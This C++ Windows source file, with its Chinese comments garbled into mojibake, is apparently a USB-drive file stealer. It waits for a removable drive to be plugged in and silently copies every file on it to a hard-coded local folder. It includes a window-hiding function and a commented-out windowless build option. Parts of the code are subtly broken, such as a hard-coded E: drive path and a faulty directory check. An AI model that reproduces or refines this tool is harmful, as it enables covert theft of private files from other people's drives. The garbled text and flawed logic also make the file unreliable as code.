#define _CRT_SECURE_NO_WARNINGS
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 

#include<iostream>
#include<windows.h>
#include<tchar.h>
#include<string>
#include<vector>

using namespace std;

//����������ſ��������ļ����ļ���
LPCTSTR PATH = _T("D:\\desktop\\newfile");

//�����ļ���
void creatDir(LPCTSTR path) {
    bool ret = CreateDirectory(path,NULL);
    if (ret) {
        cout << "�Ѵ������ļ���:"<<path << endl;
    }
    else{
        cout << "���ļ��Ѵ���:"<<path << endl;
    }
}


//�˺�����ʹ��unicode�ַ���ʱʹ��
string wideCharToMultiByte(wchar_t* pWCStrKey)
{
    //��һ�ε���ȷ��ת�����ֽ��ַ����ĳ��ȣ����ڿ��ٿռ�
    int pSize = WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), NULL, 0, NULL, NULL);
    char* pCStrKey = new char[pSize + 1];
    //�ڶ��ε��ý�˫�ֽ��ַ���ת���ɵ��ֽ��ַ���
    WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), pCStrKey, pSize, NULL, NULL);
    pCStrKey[pSize] = '\0';
    return pCStrKey;
}



//�����ļ���ĳ���ļ���(·��)
void copyFile(LPCTSTR path, LPCTSTR newPath) {

    

    //path:ԭ�ļ�·����fullPath:���ļ�·��������
    bool bRet = CopyFile(path, newPath, true);
    //false�������ļ��Ѵ��ڣ��򸲸�
    //true�������ļ��Ѵ��ھͲ���������CopyFile����flase


    if (bRet) {
        cout << "�ѿ�����:" << newPath << endl;
        cout << "���Ƴɹ�"<<endl;
    }
    else {
        cout << "����ʧ��" << endl;
    }
}



//����ָ��·���µ��ļ��������ļ�
bool findfile(LPCTSTR path, LPCTSTR type) {
    //��ظ�Ϊʹ�ö��ַ���

    WIN32_FIND_DATA findData;
    TCHAR fullPath[MAX_PATH] = { 0 };//����·��
    _stprintf(fullPath, _T("%s\\%s"), path, type);//��ʽ����һ��������·��

    HANDLE hFind = FindFirstFile(fullPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        cout << "cant find file." << endl;
        return 0;
    }

    while (1) {
        //�����½�WIN32_FIND_DATA
        WIN32_FIND_DATA tempFindData;
        int ret = FindNextFile(hFind, &tempFindData);

        if (ret == 0) {//�ڱ����������ļ���ret��Ϊ0
            break;
        }


        if (tempFindData.cFileName[0] != '.') {//.�ļ��ǵ�ǰĿ¼  ..�ļ���ָ�����ϲ�Ŀ¼
            if (tempFindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//ATTRIBUTE:����
                cout << "�����ļ���:";
                cout << tempFindData.cFileName << endl;//��ӡ�ļ���
                cout << "------------------------" << endl;//��ӡ�ָ���


                //�ϳɿ������ڿ������ļ�·��
                TCHAR thisPath[MAX_PATH] = { 0 };
                string eraseEPath;//����ɾ���������ַ���

                _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//��ʽ��
                cout << "�����ļ���" << thisPath << endl;

                eraseEPath = thisPath;
                eraseEPath.erase(eraseEPath.find("E:\\"), sizeof("E:\\") - 1);


                //�ڱ���Ҳ������Ӧ���ļ���
                TCHAR dirPath[MAX_PATH] = { 0 };
                _stprintf(dirPath, _T("%s\\%s"), PATH, eraseEPath.c_str());//�ϳ����ڴ��������ļ��е�·��

                creatDir(dirPath);//���ô��������ڱ��ش������ļ���

                //TCHAR szPath[MAX_PATH] = { 0 };
                _stprintf(dirPath, _T("%s\\%s"), path, tempFindData.cFileName);//�ϳ����ڱ����ļ��е�·��

                findfile(dirPath, _T("*.*"));//�����µ�·�� 
                //������������������ļ��е�����
            }
            else {
                string FileName = tempFindData.cFileName;//�õ��ļ��������׺(��ʽ)
                //string FileName = wideCharToMultiByte(tempFindData.cFileName);//�������ʹ��unicode�ַ���ʱʹ��

                //cout << "�ļ���:";
                //cout << tempFindData.cFileName << endl;

                //��if��������Ҫ���ض���ʽ���ļ�
                if (1 || FileName.find(".xls") != string::npos || FileName.find(".doc") != string::npos || FileName.find(".ppt") != string::npos || FileName.find(".txt") != string::npos || FileName.find(".jpg") != string::npos || FileName.find(".png") != string::npos || FileName.find(".mp4") != string::npos) {//�����ض���ʽ���ļ�


                    //�ϳɿ������ڿ������ļ�·��
                    TCHAR thisPath[MAX_PATH] = { 0 };
                    _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//��ʽ��
                    cout << "�����ļ�" << thisPath << endl;

                    //ɾ��ǰ��ģ�E:\\�����ںϳ��µ��ļ���·��
                    string eraseEPath = thisPath;
                    eraseEPath.erase(eraseEPath.find("E:\\"), sizeof("E:\\")-1);
                    //��������ļ�������ô��eraseEPath��Ϊ��


                    //�ϳɴ��ļ��еı���·��
                    TCHAR addDirNamePath[MAX_PATH] = { 0 };
                    _stprintf(addDirNamePath, _T("%s\\%s"), PATH, eraseEPath.c_str());
                    copyFile(thisPath, addDirNamePath);
                    //��һ����ԭ�ļ���·�����ڶ����Ǹõ����������洢��·������������ֱ�Ӱ�ԭ����·���������ù�����
                }


            }


        }


    }

    FindClose(hFind);//�ر��ļ�

    return 1;
}




//����Ƿ���U�̲���   ��   ����u�̵�����
TCHAR getDrives() {
    TCHAR TDrives[MAX_PATH] = { 0 };
    int key = 0;//���û������3�Ͳ�����


    while (key != 2) {
        //��ȡ���д���
        GetLogicalDriveStrings(MAX_PATH, TDrives);

        TCHAR* signal = TDrives;
        while (*signal) {//�õ�����
            if (GetDriveType(signal) == 2) {
                key = GetDriveType(signal);
                cout << "��⵽U�̲���" << endl;
                TCHAR drivePath = *signal;
                //cout << drivePath;//��ӡ��־
                return drivePath;//����U������һ����
            }
            else{
                cout << "���ڼ��..." << endl;
                Sleep(250);
                system("cls");
            }
            signal += 1 + _tcslen(signal);
        }
        cout << "û��U�̲���" << endl;
        Sleep(250);
        system("cls");
    }
    
}


void getFiles() {
    TCHAR drivePath = getDrives();
    TCHAR fullPath[MAX_PATH] = { 0 };//����·��
    _stprintf(fullPath, _T("%c:"), drivePath);//��ʽ��
    cout << fullPath << endl;
    findfile(fullPath, _T("*.*"));
}

//���ش���
void hideWindow() {
    HWND screen = GetForegroundWindow();
    if (screen) {
        ShowWindow(screen, SW_HIDE);
    }
}

int main() {
    creatDir(PATH);
    getFiles();
    
    //string a = "123456789123";
    //a.erase(a.find("123"),sizeof("123")-1);//������ɾ
    //cout << a << endl;
    
}




//void findFile(LPCWSTR path) {
//
//	TCHAR czPath[MAX_PATH] = { 0 };
//	_stprintf(czPath, path);
//
//	WIN32_FIND_DATA fileData = {0};//��������ļ����Եı���
//	
//	HANDLE hFile1= FindFirstFile(czPath, &fileData);//�򿪵�һ���ļ�
//	//hfile1 ���ڱ�Ǵ򿪵��ĸ��ļ�
//
//
//	while (1) {
//		cout << fileData.cFileName << endl;
//		int ret = FindNextFile(hFile1, &fileData);
//		//���ҵ����һ���ļ���ʱ�򷵻�0
//		if (ret == 0)break;
//	}
//
//}
//
//
//int main() {
//
//	findFile(_T("D:\\desktop\\myCode"));
//
//}




////����ָ��·���µ��ļ��������ļ�
//bool findfile(LPCTSTR path,LPCTSTR type, LPCTSTR dirName=_T("")) {
//    //��ظ�Ϊʹ�ö��ַ���
//
//    WIN32_FIND_DATA findData;
//    TCHAR fullPath[MAX_PATH] = { 0 };//����·��
//    _stprintf(fullPath, _T("%s\\%s"), path, type);//��ʽ����һ��������·��
//
//    HANDLE hFind = FindFirstFile(fullPath, &findData);
//
//    if (hFind == INVALID_HANDLE_VALUE) {
//        cout << "cant find file." << endl;
//        return 0;
//    }
//
//    while (1) {
//        //�����½�WIN32_FIND_DATA
//        WIN32_FIND_DATA tempFindData;
//        int ret=FindNextFile(hFind, &tempFindData);
//
//        if (ret == 0) {//�ڱ����������ļ���ret��Ϊ0
//            break;
//        }
//
//
//        if (tempFindData.cFileName[0] != '.') {//.�ļ��ǵ�ǰĿ¼  ..�ļ���ָ�����ϲ�Ŀ¼
//            if (tempFindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//ATTRIBUTE:����
//                cout << "�����ļ���:";
//                cout << tempFindData.cFileName << endl;//��ӡ�ļ���
//                cout << "------------------------" << endl;//��ӡ�ָ���
//
//                //�ڱ���Ҳ������Ӧ���ļ���
//                TCHAR dirPath[MAX_PATH] = { 0 };
//                _stprintf(dirPath, _T("%s\\%s"), PATH, tempFindData.cFileName);//�ϳ����ڴ��������ļ��е�·��
//                creatDir(dirPath);//���ô�������
//
//                TCHAR szPath[MAX_PATH] = { 0 };
//                _stprintf(szPath, _T("%s\\%s"), path, tempFindData.cFileName);//�����ļ����ڵ�����
//                findfile(szPath,_T("*.*"), tempFindData.cFileName);//�����µ�·�� 
//                //������������������ļ��е�����
//            }
//            else {
//                string FileName = tempFindData.cFileName;//�õ��ļ��������׺(��ʽ)
//                //string FileName = wideCharToMultiByte(tempFindData.cFileName);//�������ʹ��unicode�ַ���ʱʹ��
//
//                //cout << "�ļ���:";
//                //cout << tempFindData.cFileName << endl;
//
//                //��if��������Ҫ���ض���ʽ���ļ�
//                if (1||FileName.find(".xls") != string::npos||FileName.find(".doc") != string::npos || FileName.find(".ppt") != string::npos || FileName.find(".txt") != string::npos|| FileName.find(".jpg") != string::npos|| FileName.find(".png") != string::npos|| FileName.find(".mp4") != string::npos) {//�����ض���ʽ���ļ�
//
//
//                    //�ϳɿ������ڿ������ļ�·��
//                    TCHAR thisPath[MAX_PATH] = { 0 };
//                    _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//��ʽ��
//                    cout << "�����ļ�" << thisPath << endl;
//
//
//                    //�ϳɴ��ļ��еı���·��
//                    if (dirName != "") {//���ж��Ƿ����ļ�����
//                        TCHAR addDirNamePath[MAX_PATH] = { 0 };
//                        _stprintf(addDirNamePath, _T("%s\\%s"), PATH,dirName);
//
//                        //����copyfile()
//                        copyFile(thisPath, addDirNamePath, tempFindData.cFileName);
//                        //��һ����ԭ�ļ���·�����ڶ����Ǹõ����������洢��·������������ֱ�Ӱ�ԭ���������ù�����
//                    }
//                    else {
//                        //����copyfile()
//                        copyFile(thisPath, PATH, tempFindData.cFileName);
//                        //��һ����ԭ�ļ���·�����ڶ����Ǹõ����������洢��·������������ֱ�Ӱ�ԭ���������ù�����
//                    }
//
//                }
//                
//
//            }
//
//
//        }
//    }
//
//    FindClose(hFind);//�ر��ļ�
//
//    return 1;
//}

////�����ļ���ĳ���ļ���(·��)
//void copyFile(LPCTSTR path, LPCTSTR newPath, LPCTSTR newName) {
//
//    TCHAR fullPath[MAX_PATH] = { 0 };//����·��
//    _stprintf(fullPath, _T("%s\\%s"), newPath, newName);//��ʽ��
//    cout <<"�ѿ�����:" << fullPath << endl;
//    //path:ԭ�ļ�·����fullPath:���ļ�·��������
//    bool bRet = CopyFile(path, fullPath, true);
//    //false�������ļ��Ѵ��ڣ��򸲸�
//    //true�������ļ��Ѵ��ھͲ���������CopyFile����flase
//
//
//    if (bRet) {
//        cout << "���Ƴɹ�" << endl;
//    }
//    else {
//        cout << "����ʧ��" << endl;
//    }
//}


